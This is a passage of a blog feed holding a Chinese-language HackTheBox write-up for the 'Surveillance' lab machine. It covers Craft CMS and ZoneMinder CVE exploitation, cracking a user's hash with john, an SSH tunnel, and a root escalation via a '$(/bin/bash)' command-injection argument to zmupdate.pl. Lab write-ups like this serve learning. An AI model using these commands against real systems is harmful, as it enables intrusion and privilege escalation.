+    <title>Surveillance Write Up on HackTheBox</title>
+    <url>/2024/04/08/surveillance-htb/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>沒想像中難ㄉ靶機，好欸今天晚上目前打了兩台owob<br><del>也順便先去把昨天的wifi給打完了</del>  </p>
+<p>Attacker’s IP : 10.10.14.92<br>Victim’s IP : 10.10.11.245<br>Victim’s Host : surveillance.htb  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><p><del>打HTB以來一直想直接跳過這步驟的撰寫</del>  </p>
+<h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><img src="https://hackmd.io/_uploads/B1NLQd-lC.png" alt="image"><br>port 22是ssh<br>port 80是一個web服務  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2023-41892"><a href="#CVE-2023-41892" class="headerlink" title="CVE-2023-41892"></a>CVE-2023-41892</h4><p>連進去web服務，發現是由 Craft CMS 建立的：<br><img src="https://hackmd.io/_uploads/Sk-gNOWeC.png" alt="image"><br>本來打算用2024年的另一個CVE打不過發現有patch，經過簡單的搜尋就改成使用CVE-2023-41892的漏洞直接進行RCE。<br>使用腳本：<a href="https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226">https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226</a><br><img src="https://hackmd.io/_uploads/rk3rVd-lC.png" alt="image">  </p>
+<p>彈到 port 1004 get shell  </p>
+<p><img src="https://hackmd.io/_uploads/BJSRS_bgC.png" alt="image">  </p>
+<h3 id="Privilege-Esacalation"><a href="#Privilege-Esacalation" class="headerlink" title="Privilege Esacalation"></a>Privilege Esacalation</h3><h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>彈進去的時候所在的目錄是：<code>/var/www/html/craft/web/cpresources</code><br>簡單逛兩圈就會在<code>/var/www/html/craft/storage/backups</code>  發現一個zip檔案：<code>surveillance--2023-10-17-202801--v4.4.14.sql.zip</code><br>在目標主機用<code>python3 -m http.server</code>簡單建立一個http server後把檔案抓回來解壓縮後看，發現使用者<code>matthew</code>的密碼hash<br><img src="https://hackmd.io/_uploads/ryftUdWlC.png" alt="image"><br>利用密碼爆破工具john搭配rockyou.txt進行字典攻擊：<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john pass --wordlist=~/rockyou.txt --format=Raw-SHA256</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rJ6nLd-l0.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/SkDCUOWeA.png" alt="image"><br>用<code>su</code>切去matthew的身分就好 :D  </p>
+<h4 id="Exploiting-ZoneMinder"><a href="#Exploiting-ZoneMinder" class="headerlink" title="Exploiting ZoneMinder"></a>Exploiting ZoneMinder</h4><p>在linpeas裡面看到這個，上網google一下<del>然後全部都是Write up</del><br><img src="https://hackmd.io/_uploads/r1-qwd-l0.png" alt="image"><br>總之，他在內網開了一個ZoneMinder的服務，要先把它串出來：<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L 8091:127.0.0.1:8080 matthew@10.10.11.245</span><br></pre></td></tr></table></figure>
+<p>接著利用<code>CVE-2023-26035</code>的漏洞拿RCE<br><a href="https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py">https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py</a>  </p>
+<p><img src="https://hackmd.io/_uploads/HJzY_O-lA.png" alt="image"><br>在本地彈到使用者zoneminder的權限<br><img src="https://hackmd.io/_uploads/B1Kh_OZg0.png" alt="image">  </p>
+<p>這麼做的目的應該就是讓它可以合理操控zoneminder的相關perl腳本(?)  </p>
+<p><a href="https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/">https://vk9-sec.com/privilege-escalation-zoneminder-scripts-command-injection-local/</a>  </p>
+<p>上網google找到這個command injection，照打：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/zmupdate.pl --version 1 --user=<span class="string">&#x27;$(/bin/bash)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/H1LbFO-gC.png" alt="image"><br>發現無法輸出，只好再串一個reverse shell出來(<br><img src="https://hackmd.io/_uploads/SyCXYdZg0.png" alt="image"><br>結束owob  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>今天晚上還會再打一台麻~<br>挑題easy的練手感(?)  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
